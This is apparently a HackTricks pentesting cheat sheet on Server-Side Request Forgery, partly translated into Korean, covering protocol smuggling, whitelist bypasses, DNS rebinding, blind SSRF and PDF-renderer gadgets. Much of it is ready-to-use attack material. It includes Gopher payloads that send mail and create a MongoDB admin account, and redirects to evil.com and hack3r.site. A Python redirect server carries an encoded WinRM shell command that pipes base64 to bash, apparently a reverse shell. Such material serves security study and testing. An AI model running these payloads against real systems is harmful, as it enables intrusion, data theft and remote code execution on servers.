# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

A **Server-side Request Forgery (SSRF)** vulnerability occurs when an attacker manipulates a **server-side application** into making **HTTP requests** to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.

## Capture SSRF

먼저 해야 할 일은 자신이 발생시킨 SSRF 상호작용을 캡처하는 것입니다. HTTP 또는 DNS 상호작용을 캡처하려면 다음과 같은 도구를 사용할 수 있습니다:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Whitelisted Domains Bypass

대부분 SSRF는 **특정 화이트리스트 도메인**이나 URL에서만 동작하는 것을 발견하게 됩니다. 다음 페이지에는 해당 화이트리스트를 우회하기 위해 시도할 수 있는 **기법 모음**이 있습니다:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via open redirect

서버가 제대로 보호되어 있더라도 웹페이지 내의 Open Redirect를 악용하면 모든 제한을 **우회할 수 있습니다**. 웹페이지가 **같은 도메인에 대한 SSRF**를 허용하고 아마도 **리디렉션을 따라갈** 것이기 때문에, Open Redirect를 이용해 서버가 내부 리소스에 접근하도록 만들 수 있습니다.\
자세한 내용은 다음을 참조하세요: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## Protocols

- **file://**
- The URL scheme `file://` is referenced, pointing directly to `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- The DICT URL scheme is described as being utilized for accessing definitions or word lists via the DICT protocol. An example given illustrates a constructed URL targeting a specific word, database, and entry number, as well as an instance of a PHP script being potentially misused to connect to a DICT server using attacker-provided credentials: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identified as a protocol for secure file transfer over secure shell, an example is provided showcasing how a PHP script could be exploited to connect to a malicious SFTP server: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, operating over UDP, is mentioned with an example of a PHP script designed to send a request to a TFTP server. A TFTP request is made to 'generic.com' on port '12346' for the file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- This segment covers the Lightweight Directory Access Protocol, emphasizing its use for managing and accessing distributed directory information services over IP networks.Interact with an LDAP server on localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- A method is described for exploiting SSRF vulnerabilities to interact with SMTP services on localhost, including steps to reveal internal domain names and further investigative actions based on that information.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- SSRF가 **curl**로 실행되는 경우, curl에는 [**URL globbing**](https://everything.curl.dev/cmdline/globbing)이라는 기능이 있어 WAFs를 우회하는 데 유용할 수 있습니다. 예를 들어 이 [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)에서 **path traversal via `file` protocol**에 대한 예시를 찾을 수 있습니다:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher 프로토콜이 서버 통신을 위해 **IP, port and bytes**를 지정할 수 있는 기능과, payloads를 제작하기 위한 Gopherus 및 remote-method-guesser 같은 도구들이 설명된다. 두 가지 사용 사례가 예시로 제시된다:

### Gopher://

이 프로토콜을 사용하면 서버가 **IP, port and bytes**를 **send**하도록 지정할 수 있습니다. 그런 다음, 기본적으로 SSRF를 악용해 **communicate with any TCP server**할 수 있습니다(단, 먼저 서비스와 어떻게 통신하는지 알아야 합니다).\
다행히도 [Gopherus](https://github.com/tarunkant/Gopherus)를 사용하면 여러 서비스용 payloads를 만들 수 있습니다. 또한, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)는 _gopher_ payloads를 _Java RMI_ 서비스용으로 생성하는 데 사용할 수 있습니다.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — 1337으로 Back connect**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- username=admin, password=admin123, permission=administrator 권한의 사용자 생성
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF를 통한 Referrer header & 기타

서버에 설치된 분석 소프트웨어는 종종 들어오는 링크를 추적하기 위해 Referrer header를 로그에 남깁니다. 이 관행은 의도치 않게 애플리케이션을 Server-Side Request Forgery (SSRF) 취약점에 노출시킬 수 있습니다. 이는 해당 소프트웨어가 Referrer header에 명시된 외부 URL을 방문하여 추천 사이트의 내용을 분석할 수 있기 때문입니다. 이러한 취약점을 찾아내기 위해, 분석 도구들이 Referer header를 처리하는 방식을 활용하는 Burp Suite 플러그인 **Collaborator Everywhere**를 권장합니다. 이 플러그인은 잠재적인 SSRF 공격 표면을 식별하는 데 도움이 됩니다.

## 인증서의 SNI 데이터를 통한 SSRF

간단한 설정으로 임의의 백엔드에 연결할 수 있게 하는 잘못된 구성의 예시는 다음의 Nginx 구성에서 확인할 수 있습니다:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
이 구성에서는 Server Name Indication (SNI) 필드의 값이 backend의 주소로 직접 사용됩니다. 이 설정은 Server-Side Request Forgery (SSRF) 취약점을 노출하며, SNI 필드에 원하는 IP 주소나 도메인 이름을 지정하는 것만으로 악용될 수 있습니다. 아래는 `openssl` 명령을 사용해 `internal.host.com` 같은 임의의 backend에 연결을 강제하는 익스플로잇 예시입니다:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

일부 TLS 스택은 피어 인증서 내부의 **Authority Information Access (AIA) → CA Issuers** URI를 사용하여 누락된 중간 CA를 자동으로 다운로드합니다. **Java**에서 mTLS 서비스를 실행하면서 `-Dcom.sun.security.enableAIAcaIssuers=true`를 활성화하면 서버가 핸드셰이크 도중에 클라이언트 인증서의 공격자가 제어하는 URI를 역참조하게 되어 HTTP 로직이 실행되기 전에 요청이 발생합니다.

- **Requirements**: mTLS 활성화, Java AIA fetching 활성화, 공격자가 조작된 AIA CA Issuers URI가 포함된 클라이언트 인증서를 제시할 수 있어야 함.
- **SSRF 유발** (Java 21 예):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
Java의 certpath debug 출력은 `CertStore URI:http://localhost:8080`를 보여주며, `nc`는 `-Dhttp.agent`에서 제어 가능한 `User-Agent`와 함께 HTTP 요청을 캡처하여 인증서 검증 중 SSRF가 발생했음을 증명합니다.
- **DoS via file://**: AIA CA Issuers를 `file:///dev/urandom`으로 설정하면 Unix 계열 호스트에서 Java가 이를 CertStore로 취급해 무한한 랜덤 바이트를 읽어 CPU 코어를 점유하며 클라이언트가 연결을 끊은 후에도 이후 연결을 차단할 수 있습니다.

## SSRF via CSS Pre-Processors

LESS는 변수, mixins, functions와 강력한 `@import` 디렉티브를 제공하는 인기 있는 CSS pre-processor입니다. 컴파일 과정에서 LESS 엔진은 `@import` 문에서 참조된 리소스를 **가져와** `(inline)` 옵션이 사용되면 해당 내용을 결과 CSS에 인라인으로 포함합니다.

악용 방법은 다음을 확인하세요:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

다음과 같은 payload를 시도해볼 가치가 있습니다: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDF 렌더링

웹 페이지가 제공한 정보를 사용해 자동으로 PDF를 생성한다면, PDF를 생성하는 과정에서 PDF 생성기 자체(서버)에서 실행될 **JS를 삽입할 수 있으며**, 이를 통해 SSRF를 악용할 수 있습니다. [**자세한 정보는 여기에서**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF에서 DoS로

여러 세션을 만들어 세션을 통해 SSRF를 악용해 큰 파일을 다운로드해 보세요.

## SSRF PHP Functions

취약한 PHP 및 Wordpress 함수는 다음 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

일부 공격에서는 **리다이렉트 응답을 전송해야 할 수 있습니다**(예: gopher 같은 다른 프로토콜 사용을 위해). 아래에는 리다이렉트로 응답하는 다양한 python 코드가 있습니다:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## SSRF로 이어지는 잘못 구성된 proxies

팁 [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy 취약한 code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask는 시작 문자로 **`@`**를 사용하는 것을 허용합니다. 이는 **초기 호스트 이름을 username으로 만들어** 새 호스트를 주입할 수 있게 합니다. Attack request:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

취약한 코드:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

요청의 **경로를 시작할 수 있음**이 문자 **`;`**로 가능하다는 것이 발견되었고, 이를 통해 이후 **`@`**를 사용해 새 호스트를 주입하여 접근할 수 있다. 공격 요청:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP 내장 웹 서버 <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>취약한 PHP 코드</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP는 URL의 경로에서 **슬래시 앞에 문자 `*`를 사용하는 것을 허용하지만**, 다른 제한이 있어 루트 경로명 `/`에서만 사용할 수 있고 첫 번째 슬래시 앞에는 점 `.`을 허용하지 않으므로 예를 들어 점 없는 16진수로 인코딩된 IP 주소를 사용해야 합니다:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

만약 **problems**로 인해 **exfiltrate content from a local IP**하는 데 **CORS/SOP** 때문에 문제가 있다면, **DNS Rebidding**을 사용해 그 제한을 우회할 수 있다:

{{#ref}}
../cors-bypass.md
{{#endref}}

### Automated DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) 은 [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) 공격을 수행하기 위한 도구다. 이 도구는 공격자 도메인의 DNS 이름을 타겟 머신의 IP 주소로 rebind하고, 타겟 머신의 취약한 소프트웨어를 악용하기 위한 페이로드를 제공하는 데 필요한 구성 요소를 포함한다.

또한 **공개로 운영 중인 서버**는 [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)를 확인하라

## DNS Rebidding + TLS Session ID/Session ticket

Requirements:

- **SSRF**
- **Outbound TLS sessions**
- **Stuff on local ports**

Attack:

1. Ask the user/bot **access** a **domain** controlled by the **attacker**
2. The **TTL** of the **DNS** is **0** sec (so the victim will check the IP of the domain again soon)
3. A **TLS connection** is created between the victim and the domain of the attacker. The attacker introduces the **payload inside** the **Session ID or Session Ticket**.
4. The **domain** will start an **infinite loop** of redirects against **himself**. The goal of this is to make the user/bot access the domain until it perform **again** a **DNS request** of the domain.
5. In the DNS request a **private IP** address is given **now** (127.0.0.1 for example)
6. The user/bot will try to **reestablish the TLS connection** and in order to do so it will **send** the **Session** ID/Ticket ID (where the **payload** of the attacker was contained). So congratulations you managed to ask the **user/bot attack himself**.

Note that during this attack, if you want to attack localhost:11211 (_memcache_) you need to make the victim establish the initial connection with www.attacker.com:11211 (the **port must always be the same**).\
To **perform this attack you can use the tool**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
For **more information** take a look to the talk where this attack is explained: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

blind SSRF와 non-blind SSRF의 차이는 blind에서는 SSRF 요청의 응답을 볼 수 없다는 점이다. 그 때문에 exploit이 더 어렵고, 알려진 취약점들만 이용해서 공격할 수 있는 경우가 많다.

### Time based SSRF

**Checking the time** of the responses from the server it might be **possible to know if a resource exists or not** (maybe it takes more time accessing an existing resource than accessing one that doesn't exist)

### From blind to full abusing status codes

According to this [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), some blind SSRF might happen because even if the targeted URL responds with a 200 status code (like AWS metadata), this data is not properly formatted and therefore the app might refuse to show it.

However, it was found that sending some redirects responses from 305 to 309 in the SSRF might make the application **follow these redirects while entering an error mode** that no longer will check the format of the data and might just print it.

The python server used to exploit this is the following:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**단계:**
- First 302 gets the app to start following.
- Then it receives 305 → 306 → 307 → 308 → 309 → 310.
- After the 5th strange code the PoC finally returns 302 → 169.254.169.254 → 200 OK.

**대상 내부에서 무슨 일이 일어나는가:**
- libcurl itself does follow 305–310; it just normalises unknown codes to “follow.”
- After N weird redirects (≥ 5 here) the application’s own wrapper decides “something is off” and switches to an error mode meant for debugging.
- In that mode it dumps the entire redirect chain plus final body back to the outside caller.
- 결과: attacker가 모든 헤더 + 메타데이터 JSON을 보게 된다, 임무 완수.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### 블라인드 SSRF 가젯으로서의 HTML-to-PDF 렌더러

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0은 각 `<img>` 리소스에 대해 여러 번의 조회 시도를 수행하므로, 하나의 페이로드로 여러 요청을 생성할 수 있습니다(타이밍 기반 포트 스캔에 유용).
- html2pdf는 `<img>`에 대해 TCPDF의 동작을 복제하고 `Css::extractStyle()` 내부에서 CSS 페칭을 추가합니다. 이 함수는 얕은 스킴 검사 후 `file_get_contents($href)`를 호출합니다. 이를 악용해 loopback services, RFC1918 ranges, 또는 cloud metadata endpoints를 타격하세요.
- 이 SSRF primitive를 [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal)와 결합하면 내부 HTTP 응답과 PDF로 렌더링된 로컬 파일을 모두 leak할 수 있습니다.

하드닝 담당자는 렌더링 전에 외부 URL을 제거하거나 렌더러를 네트워크 샌드박스에 격리해야 합니다. 그 전까지는 PDF 생성기를 블라인드 SSRF 프록시로 취급하세요.

## Cloud SSRF Exploitation

클라우드 환경에서 실행 중인 머신에서 SSRF 취약점을 발견하면 클라우드 환경에 대한 유의미한 정보나 자격증명까지 얻을 수 있습니다:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF Vulnerable Platforms

여러 알려진 플랫폼에서 SSRF 취약점을 포함하거나 포함했던 사례가 있습니다. 다음을 확인하세요:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Tools

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF 취약점을 탐지하고 악용하기 위한 도구

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

이 도구는 다음을 위한 Gopher 페이로드를 생성합니다:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_는 대부분의 일반적인 _Java RMI_ 취약점에 대한 공격 작업을 지원하는 _Java RMI_ 취약점 스캐너입니다. 사용 가능한 작업 대부분은 요청된 작업에 대한 SSRF 페이로드를 생성하기 위해 `--ssrf` 옵션을 지원합니다. `--gopher` 옵션과 함께 사용하면 즉시 사용할 수 있는 gopher 페이로드를 직접 생성할 수 있습니다.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

